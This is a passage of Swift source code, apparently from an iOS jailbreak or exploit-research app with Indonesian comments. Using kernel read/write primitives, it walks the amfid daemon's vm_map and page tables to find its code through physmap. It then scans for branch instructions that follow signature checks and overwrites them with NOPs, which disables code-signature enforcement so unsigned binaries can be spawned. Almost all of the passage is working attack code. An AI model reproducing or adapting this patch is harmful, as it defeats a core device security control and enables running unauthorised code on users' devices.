        let hdrNext = ds_kread64(amfidVmMap + 0x18)
        detail += "vm_map hdr.next: 0x\(String(format: "%llx", hdrNext))\n"

        if hdrNext != 0 && isSafeKernelHeapKreadAddress(hdrNext) {
            var entry = hdrNext
            var scanned = 0
            while entry != 0 && entry != amfidVmMap && scanned < 256 {
                guard isSafeKernelHeapKreadAddress(entry) else { break }
                let vmeStart = ds_kread64(entry + 0x10)
                let vmeEnd   = ds_kread64(entry + 0x18)
                let vmeFlags = ds_kread64(entry + 0x20)

                // amfid __TEXT: userspace arm64, executable, ~0x100000000-0x102000000
                // flags bit 8 = VM_PROT_EXECUTE
                let isExec = (vmeFlags & 0x8) != 0 || (vmeFlags & 0x100) != 0
                let isUserText = vmeStart >= 0x100000000 && vmeStart < 0x200000000

                if isExec && isUserText && amfidTextStart == 0 {
                    amfidTextStart = vmeStart
                    amfidTextEnd   = vmeEnd
                    detail += "✅ amfid __TEXT: 0x\(String(format: "%llx", vmeStart))-0x\(String(format: "%llx", vmeEnd)) flags=0x\(String(format: "%llx", vmeFlags))\n"
                }

                let next = ds_kread64(entry + 0x08)
                if next == entry || next == 0 { break }
                entry = next
                scanned += 1
            }
            detail += "Scanned \(scanned) vm_map entries\n"
        }

        // Fallback: amfid text biasanya mulai di 0x100000000 pada arm64
        if amfidTextStart == 0 {
            detail += "vm_map walk gagal — pakai default amfid text base 0x100000000\n"
            amfidTextStart = 0x100000000
            amfidTextEnd   = 0x102000000
        }

        detail += "amfid text range: 0x\(String(format: "%llx", amfidTextStart))-0x\(String(format: "%llx", amfidTextEnd))\n\n"

        // ── Step 3: Walk page table untuk amfid text → physical address ──
        detail += "=== Step 3: Page table walk amfid text ===\n"

        // Untuk baca/tulis amfid text via physmap, perlu physical address
        // Gunakan kernel pmap chain untuk walk page table amfid
        // amfid pmap ada di amfid task → vm_map → pmap

        // Cari pmap dari amfid vm_map
        var amfidPmap: UInt64 = 0
        if amfidVmMap != 0 {
            // vm_map → pmap biasanya di offset 0x40-0x60
            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60, 0x38] {
                let candidate = ds_kreadptr(amfidVmMap + off)
                if isLikelyKernelPointer(candidate) && pmapCandidateScore(candidate) >= 3 {
                    amfidPmap = candidate
                    detail += "amfid pmap (vm_map+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", candidate))\n"
                    break
                }
            }
        }

        // Walk page table untuk amfid text start
        let targetVA = amfidTextStart
        let l1Idx = (targetVA >> 36) & 0x7
        let l2Idx = (targetVA >> 25) & 0x7FF
        let l3Idx = (targetVA >> 14) & 0x7FF
        let pageOff = targetVA & 0x3FFF

        detail += "Target VA: 0x\(String(format: "%llx", targetVA))\n"
        detail += "L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format: "%x", pageOff))\n"

        var amfidPmapRootOff: UInt64 = 0
        var amfidPmapRootIsL1 = false

        if amfidPmap != 0 {
            // Read L1 root dari amfid pmap
            // +0x00 biasanya kernel VA (pointer ke struct lain)
            // +0x08 biasanya physical TTBR (arm64 page table base)
            // Coba +0x08 dulu (physical TTBR), lalu +0x00 (kernel VA)
            for (off, name) in [(UInt64(8), "+0x08"), (UInt64(0), "+0x00")] {
                // Baca RAW value (tanpa PAC strip) untuk physical address
                let rawVal = ds_kread64_safe(amfidPmap + off)
                // Juga coba PAC-stripped
                let ptrVal = ds_kreadptr(amfidPmap + off)

                // Cek apakah raw value adalah physical TTBR
                let l1Root: UInt64
                if isReasonablePhysTT(rawVal) {
                    l1Root = rawVal
                } else if isReasonablePhysTT(ptrVal) {
                    l1Root = ptrVal
                } else if isKernelOrPhysmapVA(ptrVal) {
                    l1Root = ptrVal
                } else {
                    continue
                }

                // Convert to physmap VA if physical
                let l1VA: UInt64
                if isReasonablePhysTT(l1Root) {
                    l1VA = l1Root &- gPhysBase &+ gVirtBase
                } else {
                    l1VA = l1Root
                }

                guard isSafePhysmapKRWAddress(l1VA) || isSafeKernelKreadAddress(l1VA) else { continue }

                // l1VA adalah base pointer ke root table
                var l2VA = l1VA
                var isL1 = false
                var l1Entry: UInt64 = 0
                var l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)

                if (l2Entry & 0x3) != 0x3 {
                    // Coba asumsi root adalah L1 (47-bit VA space)
                    l1Entry = ds_kread64_safe(l1VA + l1Idx * 8)
                    if (l1Entry & 0x3) == 0x3 {
                        let l2Phys = l1Entry & 0x0000FFFFFFFC0000
                        l2VA = l2Phys &- gPhysBase &+ gVirtBase
                        if isSafePhysmapKRWAddress(l2VA) {
                            l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
                            isL1 = true
                        }
                    }
                }

                guard l2Entry & 0x3 == 0x3 else { continue }

                let l3Phys = l2Entry & 0x0000FFFFFFFC0000
                let l3VA = l3Phys &- gPhysBase &+ gVirtBase
                guard isSafePhysmapKRWAddress(l3VA) else { continue }

                let l3Entry = ds_kread64_safe(l3VA + l3Idx * 8)
                guard l3Entry & 0x1 == 0x1 else { continue }

                let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                amfidTextPhys = pagePhys
                amfidPmapRootOff = off
                amfidPmapRootIsL1 = isL1

                detail += "✅ Page table walk OK (\(name), rootIsL1=\(isL1))\n"
                if isL1 { detail += "  L1=0x\(String(format: "%llx", l1Entry))\n" }
                detail += "  L2=0x\(String(format: "%llx", l2Entry))\n"
                detail += "  L3=0x\(String(format: "%llx", l3Entry))\n"
                detail += "  amfid text phys: 0x\(String(format: "%llx", pagePhys))\n"
                break
            }
        }

        if amfidTextPhys == 0 {
            detail += "⚠️ Page table walk gagal — coba baca amfid text via KRW langsung\n"
            // amfid text ada di userspace — tidak bisa dibaca via kernel KRW langsung
            // Perlu page table walk yang berhasil
            detail += "❌ Tidak bisa akses amfid text tanpa physical address.\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap))\n"
            detail += "Kemungkinan: amfid pmap offset berbeda di iOS 18.2\n"
            detail += "Atau: amfid text di-protect oleh PPL (page table entries RO)\n\n"
            detail += "=== Dump amfid pmap ===\n"
            if amfidPmap != 0 {
                for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
                    let v = ds_kread64_safe(amfidPmap + off)
                    if v != 0 {
                        detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
                    }
                }
            }
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 4: Baca amfid text via physmap VA ────────────────────
        detail += "\n=== Step 4: Read amfid text via physmap ===\n"

        let amfidTextPhysmapVA = amfidTextPhys &- gPhysBase &+ gVirtBase
        detail += "amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"

        guard isSafePhysmapKRWAddress(amfidTextPhysmapVA) else {
            detail += "❌ amfid text physmap VA tidak aman.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Baca 32 bytes pertama amfid text untuk verifikasi (Mach-O header)
        let magic = ds_kread32(amfidTextPhysmapVA)
        detail += "amfid text[0]: 0x\(String(format: "%08x", magic))\n"

        let isMachO = magic == 0xFEEDFACF || magic == 0xCEFAEDFE
        if isMachO {
            detail += "✅ Mach-O header confirmed — amfid text readable via physmap!\n\n"
        } else {
            detail += "⚠️ Bukan Mach-O magic (0x\(String(format: "%08x", magic))) — mungkin page offset salah\n"
            detail += "Coba baca beberapa word untuk diagnosa:\n"
            for i: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
                let v = ds_kread64(amfidTextPhysmapVA + i)
                detail += "  +0x\(String(format: "%02x", i)): 0x\(String(format: "%016llx", v))\n"
            }
        }

        // ── Step 5: Scan amfid text untuk pola signature check ────────
        detail += "=== Step 5: Scan amfid text untuk patch target ===\n"
        detail += "Mencari pola ARM64 yang bisa di-patch untuk skip signature check...\n\n"

        // Strategi patch:
        // amfid menerima XPC request dari kernel, memanggil MISValidateSignatureAndCopyInfo
        // Return value 0 = valid, non-zero = invalid
        // Kita cari fungsi yang return non-zero untuk binary tidak valid
        // Patch: ganti dengan instruksi yang selalu return 0
        //
        // ARM64 instruksi:
        //   MOV W0, #0  = 0x52800000
        //   RET         = 0xD65F03C0
        //   NOP         = 0xD503201F
        //   BL target   = 0x94xxxxxx (branch and link)
        //   CBZ W0, lbl = 0x34xxxxxx (compare and branch if zero)
        //   CBNZ W0,lbl = 0x35xxxxxx
        //   B.NE lbl    = 0x54xxxxxx (conditional branch)
        //
        // Target: cari pola "BL + CBZ/CBNZ/B.NE" yang merupakan signature check
        // Atau: cari string reference ke "amfid" / "MISValidate" di text

        var patchTargets: [(va: UInt64, physmapVA: UInt64, original: UInt32, desc: String)] = []
        let scanPages = min(UInt64(amfidTextEnd - amfidTextStart) / 0x4000, 32) // max 32 pages = 512KB

        detail += "Scanning \(scanPages) pages (0x\(String(format: "%llx", scanPages * 0x4000)) bytes)...\n"

        for pageIdx in 0..<scanPages {
            let pageVA = amfidTextStart + pageIdx * 0x4000
            // Walk page table untuk setiap page
            let pIdx = (pageVA >> 14) & 0x7FF
            let p2Idx = (pageVA >> 25) & 0x7FF
            let p1Idx = (pageVA >> 36) & 0x7

            // Reuse root dari amfid pmap
            guard amfidPmap != 0 else { break }
            let rootPtr = ds_kreadptr(amfidPmap + amfidPmapRootOff)
            guard isReasonablePhysTT(rootPtr) || isKernelOrPhysmapVA(rootPtr) else { break }

            let rootVA: UInt64
            if isReasonablePhysTT(rootPtr) {
                rootVA = rootPtr &- gPhysBase &+ gVirtBase
            } else {
                rootVA = rootPtr
            }
            guard isSafePhysmapKRWAddress(rootVA) || isSafeKernelKreadAddress(rootVA) else { break }

            var l2v = rootVA
            if amfidPmapRootIsL1 {
                let l1e = ds_kread64_safe(rootVA + p1Idx * 8)
                if (l1e & 0x3) == 0x3 {
                    let l2p = l1e & 0x0000FFFFFFFC0000
                    l2v = l2p &- gPhysBase &+ gVirtBase
                } else { continue }
            }

            guard isSafePhysmapKRWAddress(l2v) else { continue }
            let l2e = ds_kread64_safe(l2v + p2Idx * 8)
            guard l2e & 0x3 == 0x3 else { continue }

            let l3p = l2e & 0x0000FFFFFFFC0000
            let l3v = l3p &- gPhysBase &+ gVirtBase
            guard isSafePhysmapKRWAddress(l3v) else { continue }
            let l3e = ds_kread64_safe(l3v + pIdx * 8)
            guard l3e & 0x1 == 0x1 else { continue }

            let pagePhys2 = l3e & 0x0000FFFFFFFC0000
            let pagePhysmapVA = pagePhys2 &- gPhysBase &+ gVirtBase
            guard isSafePhysmapKRWAddress(pagePhysmapVA) else { break }

            // Scan instruksi di page ini (4 bytes per instruksi ARM64)
            for instrOff: UInt64 in stride(from: 0, to: 0x4000, by: 4) {
                let instr = ds_kread32(pagePhysmapVA + instrOff)
                let instrVA = pageVA + instrOff
                let instrPhysmapVA = pagePhysmapVA + instrOff

                // Cari pola: BL (0x94xxxxxx) diikuti CBZ/CBNZ W0 (0x34/0x35 xxxxxx)
                // Ini pola umum: call fungsi, check return value
                let isBL = (instr >> 26) == 0x25  // BL instruction
                if isBL && instrOff + 4 < 0x4000 {
                    let nextInstr = ds_kread32(pagePhysmapVA + instrOff + 4)
                    let isCBZ  = (nextInstr >> 24) == 0x34  // CBZ W0
                    let isCBNZ = (nextInstr >> 24) == 0x35  // CBNZ W0
                    let isBNE  = (nextInstr & 0xFF00001F) == 0x54000001  // B.NE

                    if isCBZ || isCBNZ || isBNE {
                        let desc = isCBZ ? "BL+CBZ" : isCBNZ ? "BL+CBNZ" : "BL+B.NE"
                        patchTargets.append((
                            va: instrVA,
                            physmapVA: instrPhysmapVA,
                            original: instr,
                            desc: "\(desc) @ 0x\(String(format: "%llx", instrVA))"
                        ))
                        if patchTargets.count >= 10 { break }
                    }
                }

                // Cari pola: CBNZ W0 (return value check setelah call)
                // Patch CBNZ → NOP agar tidak branch ke error path
                let isCBNZ0 = (instr >> 24) == 0x35 && (instr & 0x1F) == 0  // CBNZ W0
                if isCBNZ0 {
                    patchTargets.append((
                        va: instrVA,
                        physmapVA: instrPhysmapVA,
                        original: instr,
                        desc: "CBNZ W0 @ 0x\(String(format: "%llx", instrVA))"
                    ))
                    if patchTargets.count >= 10 { break }
                }
            }
            if patchTargets.count >= 10 { break }
        }

        detail += "Found \(patchTargets.count) patch candidates\n\n"

        if patchTargets.isEmpty {
            detail += "❌ Tidak ada patch candidate ditemukan.\n"
            detail += "Kemungkinan: amfid text tidak terbaca via physmap, atau pola berbeda.\n"
            detail += "\nInfo untuk diagnosa:\n"
            detail += "  amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"
            detail += "  magic: 0x\(String(format: "%08x", magic))\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Log candidates
        detail += "=== Patch candidates ===\n"
        for (i, t) in patchTargets.prefix(5).enumerated() {
            detail += "  [\(i)] \(t.desc) instr=0x\(String(format: "%08x", t.original))\n"
        }
        detail += "\n"

        // ── Step 6: Patch — NOP semua CBNZ W0 di amfid text ─────────
        detail += "=== Step 6: Patch amfid text ===\n"
        detail += "Strategy: NOP semua CBNZ W0 (skip error branch setelah signature check)\n\n"

        let NOP: UInt32 = 0xD503201F
        var patchedCount = 0
        var patchLog = ""

        for t in patchTargets {
            // Hanya patch CBNZ W0 (paling aman — skip error path)
            let isCBNZ0 = (t.original >> 24) == 0x35 && (t.original & 0x1F) == 0
            guard isCBNZ0 else { continue }

            guard isSafePhysmapKRWAddress(t.physmapVA) else { continue }

            // Write NOP via physmap
            ds_kwrite32(t.physmapVA, NOP)

            // Verify
            let after = ds_kread32(t.physmapVA)
            if after == NOP {
                patchedCount += 1
                patchLog += "  ✅ Patched 0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", t.original)) → NOP\n"
            } else {
                patchLog += "  ❌ Failed 0x\(String(format: "%llx", t.va)): got 0x\(String(format: "%08x", after))\n"
            }
        }

        detail += patchLog
        detail += "\nPatched \(patchedCount) instruksi\n\n"

        if patchedCount == 0 {
            detail += "❌ Tidak ada instruksi yang berhasil di-patch.\n"
            detail += "Kemungkinan: amfid text page di-protect (W^X enforcement)\n"
            detail += "iOS 18 mungkin enforce W^X untuk userspace text pages via PPL\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "Coba baca kembali instruksi yang di-patch:\n"
            for t in patchTargets.prefix(3) {
                let readback = ds_kread32(t.physmapVA)
                detail += "  0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", readback)) (original: 0x\(String(format: "%08x", t.original)))\n"
            }
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "✅ amfid text patched!\n"
        detail += "Sekarang amfid akan skip error branch setelah signature check.\n\n"
        detail += "=== NEXT STEPS ===\n"
        detail += "1. Tap ④ Test Binary Spawn dengan path binary unsigned\n"
        detail += "2. Jika spawn berhasil tanpa SIGKILL → amfid patch works!\n"
        detail += "3. Jika masih SIGKILL → perlu patch lebih banyak instruksi\n\n"
        detail += "⚠️ amfid akan restart otomatis jika crash (KeepAlive)\n"
        detail += "⚠️ Patch hilang setelah amfid restart — perlu re-patch\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    
    #endif
}
